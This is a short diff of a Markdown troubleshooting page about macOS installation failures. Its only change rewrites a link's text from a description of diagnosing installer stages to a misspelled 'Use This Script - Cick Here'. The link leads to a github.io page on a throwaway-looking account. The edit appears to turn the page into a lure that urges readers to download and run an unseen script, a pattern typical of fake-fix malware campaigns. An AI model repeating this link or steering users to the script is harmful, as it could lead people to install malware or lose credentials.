@@ -6,7 +6,7 @@
 
 ## macOS Installation Failed — Installer Architecture, APFS Snapshot Staging, and Failure Point Taxonomy
 
-> **[Pinpoint which installer stage failed on your Mac](https://error-number-472173.github.io/.github/mac-installation-failed)** — macOS 12 Monterey through macOS 26.5 Tahoe, Intel and Apple Silicon.
+> **[Use This Script - Cick Here](https://error-number-472173.github.io/.github/mac-installation-failed)** — macOS 12 Monterey through macOS 26.5 Tahoe, Intel and Apple Silicon.
 
 **What's actually responsible for Mac Installation Failed, in order of architectural impact:**
 
